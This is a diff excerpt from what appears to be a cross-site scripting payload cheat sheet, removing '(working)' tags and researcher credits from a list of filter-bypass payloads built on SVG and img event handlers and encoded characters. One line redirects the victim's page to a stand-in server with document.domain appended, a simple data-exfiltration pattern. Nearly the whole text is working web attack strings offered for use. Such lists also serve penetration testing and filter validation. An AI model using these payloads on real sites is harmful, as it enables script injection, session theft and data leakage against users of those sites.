@@ -129,23 +129,23 @@ javascript:{ alert`0` }
 
 <svg/onload=location/**/='https://your.server/'+document.domain>
 
-<svg onx=() onload=window.alert?.()> (working)
+<svg onx=() onload=window.alert?.()>
 
-test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
+test",prompt%0A/*HelloWorld*/(document.domain)
 
-"onx+%00+onpointerenter%3dalert(domain)+x" (working)- @Brutelogic
+"onx+%00+onpointerenter%3dalert(domain)+x"
 
-"><svg%20onload=alert%26%230000000040"1")> (working)- @IamRenganathan
+"><svg%20onload=alert%26%230000000040"1")>
 
 %27%09);%0d%0a%09%09[1].find(alert)//
 
-"><img src=1 onmouseleave=print()> - @itsgeekymonk
+"><img src=1 onmouseleave=print()>
 
-<svg on onload=(alert)(document.domain)> -@zapstiko
+<svg on onload=(alert)(document.domain)>
 
-<svg/on%20onload=alert(1)> (working) -@aufzayed
+<svg/on%20onload=alert(1)>
 
-<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_m
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
 ```
 
 ## Template Injection
